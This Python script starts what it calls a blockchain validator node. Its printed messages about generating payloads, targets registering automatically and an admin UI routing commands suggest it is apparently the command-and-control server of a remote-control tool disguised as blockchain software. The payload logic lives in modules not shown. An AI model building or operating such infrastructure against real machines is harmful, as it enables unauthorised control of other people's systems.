#!/usr/bin/env python3
"""
FSDP Blockchain Validator Node
Simple validator node for testing and development
"""

import sys
import os
import time
import socket

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from fsdp.blockchain.chain import FSDPBlockchain
from fsdp.protocol.fsdp_protocol import FSDPProtocol

def get_local_ip():
    """Get local IP address"""
    try:
        # Create a socket to determine local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def main():
    print("=" * 70)
    print("FSDP BLOCKCHAIN VALIDATOR NODE")
    print("=" * 70)
    print()
    
    # Create blockchain with validator
    node_id = "validator-001"
    blockchain = FSDPBlockchain(node_id=node_id, is_validator=True)
    blockchain.add_validator(node_id)
    
    # Create protocol layer
    protocol = FSDPProtocol(blockchain, node_id, "validator")
    protocol.start()
    
    # Get network information
    local_ip = get_local_ip()
    hostname = socket.gethostname()
    
    print(f"✓ Blockchain initialized")
    print(f"✓ Validator node started")
    print(f"✓ Node ID: {node_id}")
    print(f"✓ Hostname: {hostname}")
    print(f"✓ Local IP: {local_ip}")
    print()
    print("=" * 70)
    print("CONFIGURATION FOR PAYLOADS:")
    print("=" * 70)
    print(f"  Blockchain Node Address: {local_ip}:5000")
    print(f"  Alternative (localhost): localhost:5000")
    print("=" * 70)
    print()
    print("📝 Use the address above when generating payloads in Admin UI")
    print()
    print("🔄 Validator is now listening for connections...")
    print("   - Targets will connect and register automatically")
    print("   - Admin UI will route commands through this node")
    print("   - All transactions are logged to the blockchain")
    print()
    print("Press Ctrl+C to stop the validator")
    print("=" * 70)
    
    try:
        # Keep validator running
        while True:
            time.sleep(1)
            
            # Periodically create blocks if there are pending transactions
            if len(blockchain.pending_transactions) > 0:
                block = blockchain.create_block()
                if block:
                    print(f"[{time.strftime('%H:%M:%S')}] Block #{block.index} created with {len(block.data['transactions'])} transactions")
                    
    except KeyboardInterrupt:
        print()
        print("=" * 70)
        print("Shutting down validator node...")
        print("=" * 70)
        protocol.stop()
        print("✓ Protocol stopped")
        print("✓ Validator node stopped")
        print()
        print("Goodbye!")

if __name__ == "__main__":
    main()

